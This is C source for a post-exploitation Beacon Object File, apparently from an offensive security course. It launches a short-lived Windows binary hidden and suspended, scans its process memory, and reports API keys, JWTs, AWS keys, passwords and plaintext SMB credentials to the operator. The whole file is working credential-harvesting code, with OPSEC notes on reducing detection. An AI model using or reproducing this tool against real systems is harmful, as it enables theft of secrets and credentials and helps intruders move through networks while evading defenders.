/*
 * credsLaunch.c — launch a short-lived binary and harvest its memory for creds.
 * Variation of credsMem: credsMem reads an EXISTING (long-lived) PID; many
 * targets are short-lived self-startable binaries (scheduled-task health
 * checks, updaters, service helpers) that exit before you can resolve a PID.
 * This BOF launches the binary itself and scans its memory during its brief
 * life.  ATLAS AML.T0024 / AML.T0025.  Course: M11.4 process-memory cred harvest.
 *
 * It looks for TWO kinds of signal:
 *   (1) SECRET prefixes  — AIBOF_SECRETS (sk-, eyJ, AKIA, password=, -----BEGIN,
 *       URIs, ...).  Short token-prefixes (sk-/eyJ/...) only report when followed
 *       by a long opaque token (eyJ also needs '.' => JWT) so DLL/binary noise
 *       is filtered.  Keyword patterns (password=, Password", -----BEGIN, URIs)
 *       report as-is.
 *   (2) CREDENTIAL FIELDS — Password/password/passwd/pwd/ProtectPassword/
 *       SmbPassword/Username/Domain/Share/SMB/ntlm + the user -e keyword.  On a
 *       label hit we print a WIDE context window (~240 B) so an SMB cred block
 *       {server,share,user,password} is readable.  A "near a value" filter
 *       (':','=','"','\\','/',long printable run within 80 B) skips lone label
 *       words in DLL string tables.  This is what surfaces a plaintext SMB
 *       password that has no "password=" label attached.
 *
 * Two modes:
 *   mode 0  SUSPEND-ONLY  CreateProcess(CREATE_SUSPENDED), scan the whole image,
 *           then TerminateProcess.  Never resumes.  Best for hardcoded creds.
 *   mode 1  RUN+POLL      Resume + tight snapshot loop until exit or dwellMs;
 *           kills it if still alive.  Dedups hits across snapshots.  Catches
 *           creds decrypted/fetched at runtime (e.g. an SMB password pulled from
 *           a protected config and held in heap).
 *
 * Speed: a 256-bucket first-byte dispatch table is built once so each byte
 * only tests patterns that start with that character (~20x faster than the
 * naive all-patterns loop) — this is what lets mode 1 actually poll instead of
 * spending the whole dwell on one sweep.  Per-region reads are capped at 32 MB
 * and GetTickCount() is checked inside the walk as a safety bail so a slow
 * sweep can't blow past dwell.
 *
 * OPSEC note: UNLIKE the rest of the suite this BOF DOES create a child process
 * (it is the binary under inspection — that is the point).  The harvest itself
 * is in-process (no procdump/mimikatz child).  CREATE_SUSPENDED + CREATE_NO_WINDOW
 * minimise surface; the launched binary's own activity may still log.  Prefer
 * mode 0 when static creds suffice.
 *
 * args: str exePath, str args(empty=none), int mode(0=suspend,1=run+poll),
 *       int ctx(default 80), str extraPattern(optional), int dwellMs(default 5000)
 */
#include "aibof.h"

#define MAXP        80
#define READ_CAP    (32 * 1024 * 1024)
#define FIELD_CTX   240              /* wide context window for cred-field hits */
#define MIN_RUN     6                /* printable-run floor for [str] extraction */
#define MAX_STRS    32               /* cap [str] lines per cred-field hit */

typedef struct { const char* pat; int plen; int kind; } Pat;
#define KIND_SECRET 0
#define KIND_FIELD  1

typedef struct { void* base; SIZE_T off; const char* pat; } Seen;
#define SEEN_CAP 4096

/* credential-field labels — wide-context, near-value filtered */
static const char* CRED_FIELDS[] = {
  "Password", "password", "passwd", "pwd=", "ProtectPassword",
  "SmbPassword", "SMBPassword", "smb_password", "smb_",
  "Username", "username", "Domain", "Share", "share",
  "SMB", "ntlm", "NTLM", "NetUse", NULL
};

typedef struct {
  Pat*   pats; int nPat;
  int*   head; int* headn;            /* head[256][MAXP], headn[256] */
  int    ctx;
  Seen*  sv;  int* nseen;
  int*   hits; int* fields; int* strs;
  int    privateOnly;                 /* mode 1 poll: MEM_PRIVATE regions only */
} ScanCtx;

static int seen_has(Seen* sv, int n, void* base, SIZE_T off, const char* pat) {
  for (int k = 0; k < n; k++)
    if (sv[k].base == base && sv[k].off == off && sv[k].pat == pat) return 1;
  return 0;
}

static int is_tok(unsigned char c) {
  return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
         (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '+' || c == '/' || c == '=';
}

static int structured_min_tail(const char* pat) {
  if (xcmp(pat, "sk-") == 0)         return 20;
  if (xcmp(pat, "eyJ") == 0)         return 16;
  if (xcmp(pat, "AKIA") == 0)        return 12;
  if (xcmp(pat, "ASIA") == 0)        return 12;
  if (xcmp(pat, "glpat-") == 0)      return 18;
  if (xcmp(pat, "xoxb-") == 0)       return 20;
  if (xcmp(pat, "xoxp-") == 0)       return 20;
  if (xcmp(pat, "ghp_") == 0)        return 30;
  if (xcmp(pat, "gho_") == 0)        return 30;
  if (xcmp(pat, "github_pat_") == 0) return 30;
  if (xcmp(pat, "ntk_prod_") == 0)   return 20;
  return 0;
}

static int tail_ok(const unsigned char* mem, SIZE_T i, SIZE_T got,
                   const char* pat, int plen) {
  int need = structured_min_tail(pat);
  if (need == 0) return 1;
  SIZE_T j = i + (SIZE_T)plen; int run = 0;
  for (; j < got && run < need; j++) { if (is_tok(mem[j])) run++; else break; }
  if (run < need) return 0;
  if (xcmp(pat, "eyJ") == 0) {
    SIZE_T k = i + (SIZE_T)plen;
    SIZE_T lim = (k + 256 < got) ? k + 256 : got;
    for (; k < lim; k++) if (mem[k] == '.') return 1;
    return 0;
  }
  return 1;
}

/* cred-field "near a value" filter: is there a value-ish byte / long printable
 * run within 80 B after the label?  Kills lone label words in DLL string tables. */
static int near_value(const unsigned char* mem, SIZE_T i, SIZE_T got, int plen) {
  SIZE_T j = i + (SIZE_T)plen;
  SIZE_T lim = (j + 80 < got) ? j + 80 : got;
  int prun = 0;
  for (; j < lim; j++) {
    unsigned c = mem[j];
    if (c == ':' || c == '=' || c == '"' || c == '\\' || c == '/' || c == '@' || c == '<') return 1;
    if (c >= 32 && c < 127) { prun++; if (prun >= 12) return 1; } else prun = 0;
  }
  return 0;
}

static void print_ctx(const unsigned char* mem, SIZE_T got, SIZE_T s, SIZE_T e,
                      void* base, const char* tag, const char* pat) {
  if (e > got) e = got;
  if (s > e) s = e;
  char out[1300]; int o = 0;
  for (SIZE_T j = s; j < e && o < 1200; j++) {
    char c = (char)mem[j];
    out[o++] = (c >= 32 && c < 127) ? c : '.';
  }
  out[o] = 0;
  BeaconPrintf(CALLBACK_OUTPUT, "0x%p %s [%s] :: %s\n", base, pat, tag, out);
}

/* Extract printable runs >= MIN_RUN within a +-1KB window around a cred-field
 * hit and print them as [str].  The decrypted SMB password is an UNLABELED
 * plaintext Go string (no "password=" next to it) allocated near the entry
 * struct, so label matching never sees it — this surfaces it.  Deduped via the
 * shared Seen[]; bounded to MAX_STRS lines per hit.  Mode 1 only (needs sv). */
static void extract_runs_around(const unsigned char* mem, SIZE_T got, void* base,
                                SIZE_T center, Seen* sv, int* nseen, int* strs) {
  SIZE_T s = (center > 512) ? center - 512 : 0;
  SIZE_T e = (center + 1024 < got) ? center + 1024 : got;
  int emitted = 0;
  SIZE_T i = s;
  while (i < e && emitted < MAX_STRS) {
    SIZE_T j = i; SIZE_T run = 0;
    while (j < e && mem[j] >= 32 && mem[j] < 127) { j++; run++; }
    if (run >= (SIZE_T)MIN_RUN) {
      if (!seen_has(sv, *nseen, base, i, "<str>")) {
        if (*nseen < SEEN_CAP) {
          sv[*nseen].base = base; sv[*nseen].off = i; sv[*nseen].pat = "<str>"; (*nseen)++;
        }
        char out[260]; int o = 0; SIZE_T cp = (run > 250) ? 250 : run;
        for (SIZE_T k = 0; k < cp; k++) out[o++] = (char)mem[i + k];
        out[o] = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "0x%p [str] :: %s\n", base, out);
        emitted++; (*strs)++;
      }
    }
    i = (run > 0) ? j : i + 1;
  }
}

static void scan_region(HANDLE hp, void* base, SIZE_T sz, ScanCtx* sc) {
  if (sz == 0) return;
  SIZE_T readsz = sz > READ_CAP ? READ_CAP : sz;
  unsigned char* mem = (unsigned char*)intAlloc(readsz + 1);
  if (!mem) return;
  SIZE_T got = 0;
  if (KERNEL32$ReadProcessMemory(hp, base, mem, readsz, &got) && got > 0) {
    for (SIZE_T i = 0; i < got; i++) {
      unsigned c = mem[i];
      int hn = sc->headn[c];
      const char* hit = NULL; int hlen = 0; int hkind = 0;
      for (int t = 0; t < hn; t++) {
        int k = sc->head[c * MAXP + t];
        int plen = sc->pats[k].plen;
        if (plen == 0 || i + (SIZE_T)plen > got) continue;
        int bad = 0;
        for (int j = 1; j < plen; j++) if (mem[i + j] != (unsigned char)sc->pats[k].pat[j]) { bad = 1; break; }
        if (bad) continue;
        if (sc->pats[k].kind == KIND_SECRET) {
          if (!tail_ok(mem, i, got, sc->pats[k].pat, plen)) continue;
        } else { /* KIND_FIELD */
          if (!near_value(mem, i, got, plen)) continue;
        }
        hit = sc->pats[k].pat; hlen = plen; hkind = sc->pats[k].kind; break;
      }
      if (hit) {
        if (hkind == KIND_SECRET) (*sc->hits)++; else (*sc->fields)++;
        if (sc->sv && seen_has(sc->sv, *sc->nseen, base, i, hit)) { i += (SIZE_T)xlen(hit); continue; }
        if (sc->sv && *sc->nseen < SEEN_CAP) {
          sc->sv[*sc->nseen].base = base; sc->sv[*sc->nseen].off = i; sc->sv[*sc->nseen].pat = hit; (*sc->nseen)++;
        }
        if (hkind == KIND_SECRET) {
          SIZE_T s = i > (SIZE_T)sc->ctx ? i - sc->ctx : 0;
          SIZE_T e = i + (SIZE_T)xlen(hit) + (SIZE_T)sc->ctx;
          print_ctx(mem, got, s, e, base, "secret", hit);
        } else {
          SIZE_T s = i;
          SIZE_T e = i + FIELD_CTX;
          print_ctx(mem, got, s, e, base, "field", hit);
          /* surface unlabeled plaintext creds (e.g. a decrypted SMB password
           * held as a bare Go string near the entry struct) as [str] lines */
          if (sc->sv) extract_runs_around(mem, got, base, i, sc->sv, sc->nseen, sc->strs);
        }
        i += (SIZE_T)xlen(hit);
      }
    }
  }
  intFree(mem);
}

static int sweep(HANDLE hp, ScanCtx* sc, DWORD deadline) {
  int regions = 0;
  MEMORY_BASIC_INFORMATION mbi;
  xmemset(&mbi, 0, sizeof mbi);
  unsigned char* addr = NULL;
  SIZE_T ret = 0;
  while ((ret = KERNEL32$VirtualQueryEx(hp, addr, &mbi, sizeof mbi)) == sizeof mbi) {
    if (KERNEL32$GetTickCount() >= deadline) break;          /* safety bail */
    if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_GUARD) == 0 &&
        (mbi.Protect & PAGE_NOACCESS) == 0) {
      /* mode 1 polls MEM_PRIVATE only: the Go heap arenas (0xC000000000) where
       * runtime-decrypted creds live are MEM_PRIVATE; the ~150 system DLLs are
       * MEM_IMAGE noise+bulk that made sweeps so slow we missed the brief
       * decryption window.  Mode 0 (privateOnly=0) still scans everything. */
      if (!sc->privateOnly || mbi.Type == MEM_PRIVATE) {
        scan_region(hp, mbi.BaseAddress, mbi.RegionSize, sc);
        regions++;
      }
    }
    SIZE_T step = mbi.RegionSize;
    if (step == 0) step = 0x1000;
    addr = (unsigned char*)mbi.BaseAddress + step;
    if (addr < (unsigned char*)mbi.BaseAddress) break; /* wrap */
  }
  return regions;
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* exe = BeaconDataExtract(&p, NULL);
  char* a = BeaconDataExtract(&p, NULL);
  int mode = BeaconDataInt(&p);
  int ctx = BeaconDataInt(&p);
  char* extra = BeaconDataExtract(&p, NULL);
  int dwell = BeaconDataInt(&p);
  if (!exe || !*exe) {
    BeaconPrintf(CALLBACK_ERROR, "usage: credsLaunch <exe> [args] [mode 0=suspend 1=run] [ctx] [extra] [dwellMs]\n");
    return;
  }
  if (mode != 0 && mode != 1) mode = 0;
  if (ctx <= 0) ctx = 80;
  if (dwell <= 0) dwell = 5000;

  /* build the dispatch table: AIBOF_SECRETS (secret) + extra (secret) + CRED_FIELDS (field) */
  Pat* pats = (Pat*)intAlloc((SIZE_T)MAXP * sizeof(Pat));
  int* head = (int*)intAlloc((SIZE_T)256 * MAXP * sizeof(int));
  int* headn = (int*)intAlloc((SIZE_T)256 * sizeof(int));
  Seen* sv = NULL;
  if (!pats || !head || !headn) {
    BeaconPrintf(CALLBACK_ERROR, "oom\n");
    if (pats) intFree(pats); if (head) intFree(head); if (headn) intFree(headn);
    return;
  }
  xmemset(head, 0, (SIZE_T)256 * MAXP * sizeof(int));
  xmemset(headn, 0, (SIZE_T)256 * sizeof(int));
  int nPat = 0;
  for (int k = 0; AIBOF_SECRETS[k] && nPat < MAXP; k++) {
    pats[nPat].pat = AIBOF_SECRETS[k]; pats[nPat].plen = (int)xlen(AIBOF_SECRETS[k]);
    pats[nPat].kind = KIND_SECRET; nPat++;
  }
  if (extra && *extra && nPat < MAXP) {
    pats[nPat].pat = extra; pats[nPat].plen = (int)xlen(extra); pats[nPat].kind = KIND_SECRET; nPat++;
  }
  for (int k = 0; CRED_FIELDS[k] && nPat < MAXP; k++) {
    pats[nPat].pat = CRED_FIELDS[k]; pats[nPat].plen = (int)xlen(CRED_FIELDS[k]);
    pats[nPat].kind = KIND_FIELD; nPat++;
  }
  for (int k = 0; k < nPat; k++) {
    unsigned c = (unsigned char)pats[k].pat[0];
    head[c * MAXP + headn[c]] = k;
    headn[c]++;
  }

  /* build a mutable command line: "exe" [args] */
  char cmd[1024]; int o = 0;
  cmd[o++] = '"';
  for (int i = 0; exe[i] && o < 1000; i++) cmd[o++] = exe[i];
  cmd[o++] = '"';
  if (a && *a) { cmd[o++] = ' '; for (int i = 0; a[i] && o < 1010; i++) cmd[o++] = a[i]; }
  cmd[o] = 0;

  STARTUPINFOA si; xmemset(&si, 0, sizeof si); si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = 0; /* SW_HIDE */
  PROCESS_INFORMATION pi; xmemset(&pi, 0, sizeof pi);

  DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW; /* 0x4 | 0x08000000 */
  if (!KERNEL32$CreateProcessA(exe, cmd, NULL, NULL, FALSE, flags, NULL, NULL, &si, &pi)) {
    BeaconPrintf(CALLBACK_ERROR, "CreateProcessA failed %lu (exe=%s)\n", KERNEL32$GetLastError(), exe);
    intFree(pats); intFree(head); intFree(headn);
    return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] credsLaunch %s mode=%d pid=%lu patterns=%d (suspended)\n",
               exe, mode, pi.dwProcessId, nPat);

  int nseen = 0, hits = 0, fields = 0, strs = 0, snapshots = 0, regions = 0;
  if (mode == 1) { sv = (Seen*)intAlloc((SIZE_T)SEEN_CAP * sizeof(Seen)); if (sv) xmemset(sv, 0, (SIZE_T)SEEN_CAP * sizeof(Seen)); }

  ScanCtx sc;
  sc.pats = pats; sc.nPat = nPat; sc.head = head; sc.headn = headn; sc.ctx = ctx;
  sc.sv = sv; sc.nseen = &nseen; sc.hits = &hits; sc.fields = &fields; sc.strs = &strs;
  sc.privateOnly = 0;

  DWORD start = KERNEL32$GetTickCount();
  DWORD deadline = start + (DWORD)dwell;

  if (mode == 0) {
    int r = sweep(pi.hProcess, &sc, deadline);
    if (r > regions) regions = r;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] suspend-only scan: %d regions, %d secret hits, %d field hits\n", regions, hits, fields);
    KERNEL32$TerminateProcess(pi.hProcess, 0);
    KERNEL32$WaitForSingleObject(pi.hProcess, 500);
  } else {
    KERNEL32$ResumeThread(pi.hThread);
    sc.privateOnly = 1;          /* poll MEM_PRIVATE heap only -> fast, many samples */
    for (;;) {
      snapshots++;
      int r = sweep(pi.hProcess, &sc, deadline);
      if (r > regions) regions = r;
      DWORD w = KERNEL32$WaitForSingleObject(pi.hProcess, 2);
      if (w != WAIT_TIMEOUT) break;              /* exited */
      if (KERNEL32$GetTickCount() >= deadline) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] dwell %dms reached, still alive — terminating\n", dwell);
        KERNEL32$TerminateProcess(pi.hProcess, 0);
        KERNEL32$WaitForSingleObject(pi.hProcess, 300);
        break;
      }
    }
  }

  DWORD code = 0; KERNEL32$GetExitCodeProcess(pi.hProcess, &code);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] credsLaunch done mode=%d snapshots=%d regions=%d secrets=%d fields=%d strings=%d exit=%lu\n",
               mode, snapshots, regions, hits, fields, strs, code);
  if (sv) intFree(sv);
  KERNEL32$CloseHandle(pi.hThread);
  KERNEL32$CloseHandle(pi.hProcess);
  intFree(pats); intFree(head); intFree(headn);
}